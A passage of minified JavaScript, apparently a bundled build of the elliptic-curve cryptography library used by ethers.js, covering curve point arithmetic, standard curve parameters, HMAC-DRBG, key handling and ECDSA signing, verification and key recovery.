pr(e,16),e.red||(e=e.toRed(this.red));var i=e.redSqr().redMul(e).redIAdd(e.redMul(this.a)).redIAdd(this.b),n=i.redSqrt();if(n.redSqr().redSub(i).cmp(this.zero)!==0)throw new Error("invalid point");var s=n.fromRed().isOdd();return(t&&!s||!t&&s)&&(n=n.redNeg()),this.point(e,n)};ml.prototype.validate=function(e){if(e.inf)return!0;var t=e.x,i=e.y,n=this.a.redMul(t),s=t.redSqr().redMul(t).redIAdd(n).redIAdd(this.b);return i.redSqr().redISub(s).cmpn(0)===0};ml.prototype._endoWnafMulAdd=function(e,t,i){for(var n=this._endoWnafT1,s=this._endoWnafT2,o=0;o<e.length;o++){var a=this._endoSplit(t[o]),c=e[o],l=c._getBeta();a.k1.negative&&(a.k1.ineg(),c=c.neg(!0)),a.k2.negative&&(a.k2.ineg(),l=l.neg(!0)),n[o*2]=c,n[o*2+1]=l,s[o*2]=a.k1,s[o*2+1]=a.k2}for(var u=this._wnafMulAdd(1,n,s,o*2,i),d=0;d<o*2;d++)n[d]=null,s[d]=null;return u};function Vs(r,e,t,i){Gg.BasePoint.call(this,r,"affine"),e===null&&t===null?(this.x=null,this.y=null,this.inf=!0):(this.x=new pr(e,16),this.y=new pr(t,16),i&&(this.x.forceRed(this.curve.red),this.y.forceRed(this.curve.red)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.inf=!1)}b$(Vs,Gg.BasePoint);ml.prototype.point=function(e,t,i){return new Vs(this,e,t,i)};ml.prototype.pointFromJSON=function(e,t){return Vs.fromJSON(this,e,t)};Vs.prototype._getBeta=function(){if(this.curve.endo){var e=this.precomputed;if(e&&e.beta)return e.beta;var t=this.curve.point(this.x.redMul(this.curve.endo.beta),this.y);if(e){var i=this.curve,n=function(s){return i.point(s.x.redMul(i.endo.beta),s.y)};e.beta=t,t.precomputed={beta:null,naf:e.naf&&{wnd:e.naf.wnd,points:e.naf.points.map(n)},doubles:e.doubles&&{step:e.doubles.step,points:e.doubles.points.map(n)}}}return t}};Vs.prototype.toJSON=function(){return this.precomputed?[this.x,this.y,this.precomputed&&{doubles:this.precomputed.doubles&&{step:this.precomputed.doubles.step,points:this.precomputed.doubles.points.slice(1)},naf:this.precomputed.naf&&{wnd:this.precomputed.naf.wnd,points:this.precomputed.naf.points.slice(1)}}]:[this.x,this.y]};Vs.fromJSON=function(e,t,i){typeof t=="string"&&(t=JSON.parse(t));var n=e.point(t[0],t[1],i);if(!t[2])return n;function s(a){return e.point(a[0],a[1],i)}var o=t[2];return n.precomputed={beta:null,doubles:o.doubles&&{step:o.doubles.step,points:[n].concat(o.doubles.points.map(s))},naf:o.naf&&{wnd:o.naf.wnd,points:[n].concat(o.naf.points.map(s))}},n};Vs.prototype.inspect=function(){return this.isInfinity()?"<EC Point Infinity>":"<EC Point x: "+this.x.fromRed().toString(16,2)+" y: "+this.y.fromRed().toString(16,2)+">"};Vs.prototype.isInfinity=function(){return this.inf};Vs.prototype.add=function(e){if(this.inf)return e;if(e.inf)return this;if(this.eq(e))return this.dbl();if(this.neg().eq(e))return this.curve.point(null,null);if(this.x.cmp(e.x)===0)return this.curve.point(null,null);var t=this.y.redSub(e.y);t.cmpn(0)!==0&&(t=t.redMul(this.x.redSub(e.x).redInvm()));var i=t.redSqr().redISub(this.x).redISub(e.x),n=t.redMul(this.x.redSub(i)).redISub(this.y);return this.curve.point(i,n)};Vs.prototype.dbl=function(){if(this.inf)return this;var e=this.y.redAdd(this.y);if(e.cmpn(0)===0)return this.curve.point(null,null);var t=this.curve.a,i=this.x.redSqr(),n=e.redInvm(),s=i.redAdd(i).redIAdd(i).redIAdd(t).redMul(n),o=s.redSqr().redISub(this.x.redAdd(this.x)),a=s.redMul(this.x.redSub(o)).redISub(this.y);return this.curve.point(o,a)};Vs.prototype.getX=function(){return this.x.fromRed()};Vs.prototype.getY=function(){return this.y.fromRed()};Vs.prototype.mul=function(e){return e=new pr(e,16),this.isInfinity()?this:this._hasDoubles(e)?this.curve._fixedNafMul(this,e):this.curve.endo?this.curve._endoWnafMulAdd([this],[e]):this.curve._wnafMul(this,e)};Vs.prototype.mulAdd=function(e,t,i){var n=[this,t],s=[e,i];return this.curve.endo?this.curve._endoWnafMulAdd(n,s):this.curve._wnafMulAdd(1,n,s,2)};Vs.prototype.jmulAdd=function(e,t,i){var n=[this,t],s=[e,i];return this.curve.endo?this.curve._endoWnafMulAdd(n,s,!0):this.curve._wnafMulAdd(1,n,s,2,!0)};Vs.prototype.eq=function(e){return this===e||this.inf===e.inf&&(this.inf||this.x.cmp(e.x)===0&&this.y.cmp(e.y)===0)};Vs.prototype.neg=function(e){if(this.inf)return this;var t=this.curve.point(this.x,this.y.redNeg());if(e&&this.precomputed){var i=this.precomputed,n=function(s){return s.neg()};t.precomputed={naf:i.naf&&{wnd:i.naf.wnd,points:i.naf.points.map(n)},doubles:i.doubles&&{step:i.doubles.step,points:i.doubles.points.map(n)}}}return t};Vs.prototype.toJ=function(){if(this.inf)return this.curve.jpoint(null,null,null);var e=this.curve.jpoint(this.x,this.y,this.curve.one);return e};function uo(r,e,t,i){Gg.BasePoint.call(this,r,"jacobian"),e===null&&t===null&&i===null?(this.x=this.curve.one,this.y=this.curve.one,this.z=new pr(0)):(this.x=new pr(e,16),this.y=new pr(t,16),this.z=new pr(i,16)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.z.red||(this.z=this.z.toRed(this.curve.red)),this.zOne=this.z===this.curve.one}b$(uo,Gg.BasePoint);ml.prototype.jpoint=function(e,t,i){return new uo(this,e,t,i)};uo.prototype.toP=function(){if(this.isInfinity())return this.curve.point(null,null);var e=this.z.redInvm(),t=e.redSqr(),i=this.x.redMul(t),n=this.y.redMul(t).redMul(e);return this.curve.point(i,n)};uo.prototype.neg=function(){return this.curve.jpoint(this.x,this.y.redNeg(),this.z)};uo.prototype.add=function(e){if(this.isInfinity())return e;if(e.isInfinity())return this;var t=e.z.redSqr(),i=this.z.redSqr(),n=this.x.redMul(t),s=e.x.redMul(i),o=this.y.redMul(t.redMul(e.z)),a=e.y.redMul(i.redMul(this.z)),c=n.redSub(s),l=o.redSub(a);if(c.cmpn(0)===0)return l.cmpn(0)!==0?this.curve.jpoint(null,null,null):this.dbl();var u=c.redSqr(),d=u.redMul(c),h=n.redMul(u),f=l.redSqr().redIAdd(d).redISub(h).redISub(h),p=l.redMul(h.redISub(f)).redISub(o.redMul(d)),g=this.z.redMul(e.z).redMul(c);return this.curve.jpoint(f,p,g)};uo.prototype.mixedAdd=function(e){if(this.isInfinity())return e.toJ();if(e.isInfinity())return this;var t=this.z.redSqr(),i=this.x,n=e.x.redMul(t),s=this.y,o=e.y.redMul(t).redMul(this.z),a=i.redSub(n),c=s.redSub(o);if(a.cmpn(0)===0)return c.cmpn(0)!==0?this.curve.jpoint(null,null,null):this.dbl();var l=a.redSqr(),u=l.redMul(a),d=i.redMul(l),h=c.redSqr().redIAdd(u).redISub(d).redISub(d),f=c.redMul(d.redISub(h)).redISub(s.redMul(u)),p=this.z.redMul(a);return this.curve.jpoint(h,f,p)};uo.prototype.dblp=function(e){if(e===0)return this;if(this.isInfinity())return this;if(!e)return this.dbl();var t;if(this.curve.zeroA||this.curve.threeA){var i=this;for(t=0;t<e;t++)i=i.dbl();return i}var n=this.curve.a,s=this.curve.tinv,o=this.x,a=this.y,c=this.z,l=c.redSqr().redSqr(),u=a.redAdd(a);for(t=0;t<e;t++){var d=o.redSqr(),h=u.redSqr(),f=h.redSqr(),p=d.redAdd(d).redIAdd(d).redIAdd(n.redMul(l)),g=o.redMul(h),w=p.redSqr().redISub(g.redAdd(g)),m=g.redISub(w),x=p.redMul(m);x=x.redIAdd(x).redISub(f);var S=u.redMul(c);t+1<e&&(l=l.redMul(f)),o=w,c=S,u=x}return this.curve.jpoint(o,u.redMul(s),c)};uo.prototype.dbl=function(){return this.isInfinity()?this:this.curve.zeroA?this._zeroDbl():this.curve.threeA?this._threeDbl():this._dbl()};uo.prototype._zeroDbl=function(){var e,t,i;if(this.zOne){var n=this.x.redSqr(),s=this.y.redSqr(),o=s.redSqr(),a=this.x.redAdd(s).redSqr().redISub(n).redISub(o);a=a.redIAdd(a);var c=n.redAdd(n).redIAdd(n),l=c.redSqr().redISub(a).redISub(a),u=o.redIAdd(o);u=u.redIAdd(u),u=u.redIAdd(u),e=l,t=c.redMul(a.redISub(l)).redISub(u),i=this.y.redAdd(this.y)}else{var d=this.x.redSqr(),h=this.y.redSqr(),f=h.redSqr(),p=this.x.redAdd(h).redSqr().redISub(d).redISub(f);p=p.redIAdd(p);var g=d.redAdd(d).redIAdd(d),w=g.redSqr(),m=f.redIAdd(f);m=m.redIAdd(m),m=m.redIAdd(m),e=w.redISub(p).redISub(p),t=g.redMul(p.redISub(e)).redISub(m),i=this.y.redMul(this.z),i=i.redIAdd(i)}return this.curve.jpoint(e,t,i)};uo.prototype._threeDbl=function(){var e,t,i;if(this.zOne){var n=this.x.redSqr(),s=this.y.redSqr(),o=s.redSqr(),a=this.x.redAdd(s).redSqr().redISub(n).redISub(o);a=a.redIAdd(a);var c=n.redAdd(n).redIAdd(n).redIAdd(this.curve.a),l=c.redSqr().redISub(a).redISub(a);e=l;var u=o.redIAdd(o);u=u.redIAdd(u),u=u.redIAdd(u),t=c.redMul(a.redISub(l)).redISub(u),i=this.y.redAdd(this.y)}else{var d=this.z.redSqr(),h=this.y.redSqr(),f=this.x.redMul(h),p=this.x.redSub(d).redMul(this.x.redAdd(d));p=p.redAdd(p).redIAdd(p);var g=f.redIAdd(f);g=g.redIAdd(g);var w=g.redAdd(g);e=p.redSqr().redISub(w),i=this.y.redAdd(this.z).redSqr().redISub(h).redISub(d);var m=h.redSqr();m=m.redIAdd(m),m=m.redIAdd(m),m=m.redIAdd(m),t=p.redMul(g.redISub(e)).redISub(m)}return this.curve.jpoint(e,t,i)};uo.prototype._dbl=function(){var e=this.curve.a,t=this.x,i=this.y,n=this.z,s=n.redSqr().redSqr(),o=t.redSqr(),a=i.redSqr(),c=o.redAdd(o).redIAdd(o).redIAdd(e.redMul(s)),l=t.redAdd(t);l=l.redIAdd(l);var u=l.redMul(a),d=c.redSqr().redISub(u.redAdd(u)),h=u.redISub(d),f=a.redSqr();f=f.redIAdd(f),f=f.redIAdd(f),f=f.redIAdd(f);var p=c.redMul(h).redISub(f),g=i.redAdd(i).redMul(n);return this.curve.jpoint(d,p,g)};uo.prototype.trpl=function(){if(!this.curve.zeroA)return this.dbl().add(this);var e=this.x.redSqr(),t=this.y.redSqr(),i=this.z.redSqr(),n=t.redSqr(),s=e.redAdd(e).redIAdd(e),o=s.redSqr(),a=this.x.redAdd(t).redSqr().redISub(e).redISub(n);a=a.redIAdd(a),a=a.redAdd(a).redIAdd(a),a=a.redISub(o);var c=a.redSqr(),l=n.redIAdd(n);l=l.redIAdd(l),l=l.redIAdd(l),l=l.redIAdd(l);var u=s.redIAdd(a).redSqr().redISub(o).redISub(c).redISub(l),d=t.redMul(u);d=d.redIAdd(d),d=d.redIAdd(d);var h=this.x.redMul(c).redISub(d);h=h.redIAdd(h),h=h.redIAdd(h);var f=this.y.redMul(u.redMul(l.redISub(u)).redISub(a.redMul(c)));f=f.redIAdd(f),f=f.redIAdd(f),f=f.redIAdd(f);var p=this.z.redAdd(a).redSqr().redISub(i).redISub(c);return this.curve.jpoint(h,f,p)};uo.prototype.mul=function(e,t){return e=new pr(e,t),this.curve._wnafMul(this,e)};uo.prototype.eq=function(e){if(e.type==="affine")return this.eq(e.toJ());if(this===e)return!0;var t=this.z.redSqr(),i=e.z.redSqr();if(this.x.redMul(i).redISub(e.x.redMul(t)).cmpn(0)!==0)return!1;var n=t.redMul(this.z),s=i.redMul(e.z);return this.y.redMul(s).redISub(e.y.redMul(n)).cmpn(0)===0};uo.prototype.eqXToP=function(e){var t=this.z.redSqr(),i=e.toRed(this.curve.red).redMul(t);if(this.x.cmp(i)===0)return!0;for(var n=e.clone(),s=this.curve.redN.redMul(t);;){if(n.iadd(this.curve.n),n.cmp(this.curve.p)>=0)return!1;if(i.redIAdd(s),this.x.cmp(i)===0)return!0}};uo.prototype.inspect=function(){return this.isInfinity()?"<EC JPoint Infinity>":"<EC JPoint x: "+this.x.toString(16,2)+" y: "+this.y.toString(16,2)+" z: "+this.z.toString(16,2)+">"};uo.prototype.isInfinity=function(){return this.z.cmpn(0)===0};var W8=v3(function(r,e){var t=e;t.base=Gg,t.short=Hle,t.mont=null,t.edwards=null}),H8=v3(function(r,e){var t=e,i=_c.assert;function n(a){a.type==="short"?this.curve=new W8.short(a):a.type==="edwards"?this.curve=new W8.edwards(a):this.curve=new W8.mont(a),this.g=this.curve.g,this.n=this.curve.n,this.hash=a.hash,i(this.g.validate(),"Invalid curve"),i(this.g.mul(this.n).isInfinity(),"Invalid curve, G*N != O")}t.PresetCurve=n;function s(a,c){Object.defineProperty(t,a,{configurable:!0,enumerable:!0,get:function(){var l=new n(c);return Object.defineProperty(t,a,{configurable:!0,enumerable:!0,value:l}),l}})}s("p192",{type:"short",prime:"p192",p:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",a:"ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc",b:"64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1",n:"ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831",hash:ya.sha256,gRed:!1,g:["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012","07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"]}),s("p224",{type:"short",prime:"p224",p:"ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",a:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe",b:"b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4",n:"ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d",hash:ya.sha256,gRed:!1,g:["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21","bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"]}),s("p256",{type:"short",prime:null,p:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff",a:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc",b:"5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b",n:"ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551",hash:ya.sha256,gRed:!1,g:["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296","4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"]}),s("p384",{type:"short",prime:null,p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff",a:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc",b:"b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef",n:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973",hash:ya.sha384,gRed:!1,g:["aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7","3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f"]}),s("p521",{type:"short",prime:null,p:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff",a:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc",b:"00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00",n:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409",hash:ya.sha512,gRed:!1,g:["000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66","00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650"]}),s("curve25519",{type:"mont",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"76d06",b:"1",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:ya.sha256,gRed:!1,g:["9"]}),s("ed25519",{type:"edwards",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"-1",c:"1",d:"52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:ya.sha256,gRed:!1,g:["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a","6666666666666666666666666666666666666666666666666666666666666658"]});var o;try{o=null.crash()}catch{o=void 0}s("secp256k1",{type:"short",prime:"k256",p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",a:"0",b:"7",n:"ffffffff ffffffff ffffffff fffffffe baaedce6 af48a03b bfd25e8c d0364141",h:"1",hash:ya.sha256,beta:"7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee",lambda:"5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72",basis:[{a:"3086d221a7d46bcde86c90e49284eb15",b:"-e4437ed6010e88286f547fa90abfe4c3"},{a:"114ca50f7a8e2f3f657c1108d9d44cfd8",b:"3086d221a7d46bcde86c90e49284eb15"}],gRed:!1,g:["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798","483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8",o]})});function tp(r){if(!(this instanceof tp))return new tp(r);this.hash=r.hash,this.predResist=!!r.predResist,this.outLen=this.hash.outSize,this.minEntropy=r.minEntropy||this.hash.hmacStrength,this._reseed=null,this.reseedInterval=null,this.K=null,this.V=null;var e=au.toArray(r.entropy,r.entropyEnc||"hex"),t=au.toArray(r.nonce,r.nonceEnc||"hex"),i=au.toArray(r.pers,r.persEnc||"hex");w$(e.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._init(e,t,i)}var WZ=tp;tp.prototype._init=function(e,t,i){var n=e.concat(t).concat(i);this.K=new Array(this.outLen/8),this.V=new Array(this.outLen/8);for(var s=0;s<this.V.length;s++)this.K[s]=0,this.V[s]=1;this._update(n),this._reseed=1,this.reseedInterval=281474976710656};tp.prototype._hmac=function(){return new ya.hmac(this.hash,this.K)};tp.prototype._update=function(e){var t=this._hmac().update(this.V).update([0]);e&&(t=t.update(e)),this.K=t.digest(),this.V=this._hmac().update(this.V).digest(),e&&(this.K=this._hmac().update(this.V).update([1]).update(e).digest(),this.V=this._hmac().update(this.V).digest())};tp.prototype.reseed=function(e,t,i,n){typeof t!="string"&&(n=i,i=t,t=null),e=au.toArray(e,t),i=au.toArray(i,n),w$(e.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._update(e.concat(i||[])),this._reseed=1};tp.prototype.generate=function(e,t,i,n){if(this._reseed>this.reseedInterval)throw new Error("Reseed is required");typeof t!="string"&&(n=i,i=t,t=null),i&&(i=au.toArray(i,n||"hex"),this._update(i));for(var s=[];s.length<e;)this.V=this._hmac().update(this.V).digest(),s=s.concat(this.V);var o=s.slice(0,e);return this._update(i),this._reseed++,au.encode(o,t)};var VT=_c.assert;function Bo(r,e){this.ec=r,this.priv=null,this.pub=null,e.priv&&this._importPrivate(e.priv,e.privEnc),e.pub&&this._importPublic(e.pub,e.pubEnc)}var v$=Bo;Bo.fromPublic=function(e,t,i){return t instanceof Bo?t:new Bo(e,{pub:t,pubEnc:i})};Bo.fromPrivate=function(e,t,i){return t instanceof Bo?t:new Bo(e,{priv:t,privEnc:i})};Bo.prototype.validate=function(){var e=this.getPublic();return e.isInfinity()?{result:!1,reason:"Invalid public key"}:e.validate()?e.mul(this.ec.curve.n).isInfinity()?{result:!0,reason:null}:{result:!1,reason:"Public key * N != O"}:{result:!1,reason:"Public key is not a point"}};Bo.prototype.getPublic=function(e,t){return typeof e=="string"&&(t=e,e=null),this.pub||(this.pub=this.ec.g.mul(this.priv)),t?this.pub.encode(t,e):this.pub};Bo.prototype.getPrivate=function(e){return e==="hex"?this.priv.toString(16,2):this.priv};Bo.prototype._importPrivate=function(e,t){this.priv=new pr(e,t||16),this.priv=this.priv.umod(this.ec.curve.n)};Bo.prototype._importPublic=function(e,t){if(e.x||e.y){this.ec.curve.type==="mont"?VT(e.x,"Need x coordinate"):(this.ec.curve.type==="short"||this.ec.curve.type==="edwards")&&VT(e.x&&e.y,"Need both x and y coordinate"),this.pub=this.ec.curve.point(e.x,e.y);return}this.pub=this.ec.curve.decodePoint(e,t)};Bo.prototype.derive=function(e){return e.validate()||VT(e.validate(),"public point not validated"),e.mul(this.priv).getX()};Bo.prototype.sign=function(e,t,i){return this.ec.sign(e,this,t,i)};Bo.prototype.verify=function(e,t,i){return this.ec.verify(e,t,this,void 0,i)};Bo.prototype.inspect=function(){return"<Key priv: "+(this.priv&&this.priv.toString(16,2))+" pub: "+(this.pub&&this.pub.inspect())+" >"};var Vle=_c.assert;function Ox(r,e){if(r instanceof Ox)return r;this._importDER(r,e)||(Vle(r.r&&r.s,"Signature without r or s"),this.r=new pr(r.r,16),this.s=new pr(r.s,16),r.recoveryParam===void 0?this.recoveryParam=null:this.recoveryParam=r.recoveryParam)}var Bx=Ox;function Kle(){this.place=0}function JE(r,e){var t=r[e.place++];if(!(t&128))return t;var i=t&15;if(i===0||i>4||r[e.place]===0)return!1;for(var n=0,s=0,o=e.place;s<i;s++,o++)n<<=8,n|=r[o],n>>>=0;return n<=127?!1:(e.place=o,n)}function AM(r){for(var e=0,t=r.length-1;!r[e]&&!(r[e+1]&128)&&e<t;)e++;return e===0?r:r.slice(e)}Ox.prototype._importDER=function(e,t){e=_c.toArray(e,t);var i=new Kle;if(e[i.place++]!==48)return!1;var n=JE(e,i);if(n===!1||n+i.place!==e.length||e[i.place++]!==2)return!1;var s=JE(e,i);if(s===!1||(e[i.place]&128)!==0)return!1;var o=e.slice(i.place,s+i.place);if(i.place+=s,e[i.place++]!==2)return!1;var a=JE(e,i);if(a===!1||e.length!==a+i.place||(e[i.place]&128)!==0)return!1;var c=e.slice(i.place,a+i.place);if(o[0]===0)if(o[1]&128)o=o.slice(1);else return!1;if(c[0]===0)if(c[1]&128)c=c.slice(1);else return!1;return this.r=new pr(o),this.s=new pr(c),this.recoveryParam=null,!0};function QE(r,e){if(e<128){r.push(e);return}var t=1+(Math.log(e)/Math.LN2>>>3);for(r.push(t|128);--t;)r.push(e>>>(t<<3)&255);r.push(e)}Ox.prototype.toDER=function(e){var t=this.r.toArray(),i=this.s.toArray();for(t[0]&128&&(t=[0].concat(t)),i[0]&128&&(i=[0].concat(i)),t=AM(t),i=AM(i);!i[0]&&!(i[1]&128);)i=i.slice(1);var n=[2];QE(n,t.length),n=n.concat(t),n.push(2),QE(n,i.length);var s=n.concat(i),o=[48];return QE(o,s.length),o=o.concat(s),_c.encode(o,e)};var Gle=function(){throw new Error("unsupported")},s1=_c.assert;function nl(r){if(!(this instanceof nl))return new nl(r);typeof r=="string"&&(s1(Object.prototype.hasOwnProperty.call(H8,r),"Unknown curve "+r),r=H8[r]),r instanceof H8.PresetCurve&&(r={curve:r}),this.curve=r.curve.curve,this.n=this.curve.n,this.nh=this.n.ushrn(1),this.g=this.curve.g,this.g=r.curve.g,this.g.precompute(r.curve.n.bitLength()+1),this.hash=r.hash||r.curve.hash}var Zle=nl;nl.prototype.keyPair=function(e){return new v$(this,e)};nl.prototype.keyFromPrivate=function(e,t){return v$.fromPrivate(this,e,t)};nl.prototype.keyFromPublic=function(e,t){return v$.fromPublic(this,e,t)};nl.prototype.genKeyPair=function(e){e||(e={});for(var t=new WZ({hash:this.hash,pers:e.pers,persEnc:e.persEnc||"utf8",entropy:e.entropy||Gle(this.hash.hmacStrength),entropyEnc:e.entropy&&e.entropyEnc||"utf8",nonce:this.n.toArray()}),i=this.n.byteLength(),n=this.n.sub(new pr(2));;){var s=new pr(t.generate(i));if(!(s.cmp(n)>0))return s.iaddn(1),this.keyFromPrivate(s)}};nl.prototype._truncateToN=function(e,t,i){var n;if(pr.isBN(e)||typeof e=="number")e=new pr(e,16),n=e.byteLength();else if(typeof e=="object")n=e.length,e=new pr(e,16);else{var s=e.toString();n=s.length+1>>>1,e=new pr(s,16)}typeof i!="number"&&(i=n*8);var o=i-this.n.bitLength();return o>0&&(e=e.ushrn(o)),!t&&e.cmp(this.n)>=0?e.sub(this.n):e};nl.prototype.sign=function(e,t,i,n){if(typeof i=="object"&&(n=i,i=null),n||(n={}),typeof e!="string"&&typeof e!="number"&&!pr.isBN(e)){s1(typeof e=="object"&&e&&typeof e.length=="number","Expected message to be an array-like, a hex string, or a BN instance"),s1(e.length>>>0===e.length);for(var s=0;s<e.length;s++)s1((e[s]&255)===e[s])}t=this.keyFromPrivate(t,i),e=this._truncateToN(e,!1,n.msgBitLength),s1(!e.isNeg(),"Can not sign a negative message");var o=this.n.byteLength(),a=t.getPrivate().toArray("be",o),c=e.toArray("be",o);s1(new pr(c).eq(e),"Can not sign message");for(var l=new WZ({hash:this.hash,entropy:a,nonce:c,pers:n.pers,persEnc:n.persEnc||"utf8"}),u=this.n.sub(new pr(1)),d=0;;d++){var h=n.k?n.k(d):new pr(l.generate(this.n.byteLength()));if(h=this._truncateToN(h,!0),!(h.cmpn(1)<=0||h.cmp(u)>=0)){var f=this.g.mul(h);if(!f.isInfinity()){var p=f.getX(),g=p.umod(this.n);if(g.cmpn(0)!==0){var w=h.invm(this.n).mul(g.mul(t.getPrivate()).iadd(e));if(w=w.umod(this.n),w.cmpn(0)!==0){var m=(f.getY().isOdd()?1:0)|(p.cmp(g)!==0?2:0);return n.canonical&&w.cmp(this.nh)>0&&(w=this.n.sub(w),m^=1),new Bx({r:g,s:w,recoveryParam:m})}}}}}};nl.prototype.verify=function(e,t,i,n,s){s||(s={}),e=this._truncateToN(e,!1,s.msgBitLength),i=this.keyFromPublic(i,n),t=new Bx(t,"hex");var o=t.r,a=t.s;if(o.cmpn(1)<0||o.cmp(this.n)>=0||a.cmpn(1)<0||a.cmp(this.n)>=0)return!1;var c=a.invm(this.n),l=c.mul(e).umod(this.n),u=c.mul(o).umod(this.n),d;return this.curve._maxwellTrick?(d=this.g.jmulAdd(l,i.getPublic(),u),d.isInfinity()?!1:d.eqXToP(o)):(d=this.g.mulAdd(l,i.getPublic(),u),d.isInfinity()?!1:d.getX().umod(this.n).cmp(o)===0)};nl.prototype.recoverPubKey=function(r,e,t,i){s1((3&t)===t,"The recovery param is more than two bits"),e=new Bx(e,i);var n=this.n,s=new pr(r),o=e.r,a=e.s,c=t&1,l=t>>1;if(o.cmp(this.curve.p.umod(this.curve.n))>=0&&l)throw new Error("Unable to find sencond key candinate");l?o=this.curve.pointFromX(o.add(this.curve.n),c):o=this.curve.pointFromX(o,c);var u=e.r.invm(n),d=n.sub(s).mul(u).umod(n),h=a.mul(u).umod(n);return this.g.mulAdd(d,o,h)};nl.prototype.getKeyRecoveryParam=function(r,e,t,i){if(e=new Bx(e,i),e.recoveryParam!==null)return e.recoveryParam;for(var n=0;n<4;n++){var s;try{s=this.recoverPubKey(r,e,n)}catch{continue}if(s.eq(t))return n}throw new Error("Unable to find valid recovery factor")};var Yle=v3(function(r,e){var t=e;t.version="6.6.1",t.utils=_c,t.rand=function(){throw new Error("unsupported")},t.curve=W8,t.curves=H8,t.ec=Zle,t.eddsa=null}),Jle=Yle.ec;const Qle="signing-key/5.8.0",KT=new be(Qle);let XE=null;function sd(){return XE||(XE=new Jle("secp256k1")),XE}class N1{constructor(e){Pe(this,"curve","secp256k1"),Pe(this,"privateKey",Qe(e)),Ad(this.privateKey)!==32&&KT.throwArgumentError("invalid private key","privateKey","[[ REDACTED ]]");const t=sd().keyFromPrivate(ze(this.privateKey));Pe(this,"publicKey","0x"+t.getPublic(!1,"hex")),Pe(this,"compressedPublicKey","0x"+t.getPublic(!0,"hex")),Pe(this,"_isSigningKey",!0)}_addPoint(e){const t=sd().keyFromPublic(ze(this.publicKey)),i=sd().keyFromPublic(ze(e));return"0x"+t.pub.add(i.pub).encodeCompressed("hex")}signDigest(e){const t=sd().keyFromPrivate(ze(this.privateKey)),i=ze(e);i.length!==32&&KT.throwArgumentError("bad digest length","digest",e);const n=t.sign(i,{canonical:!0});return 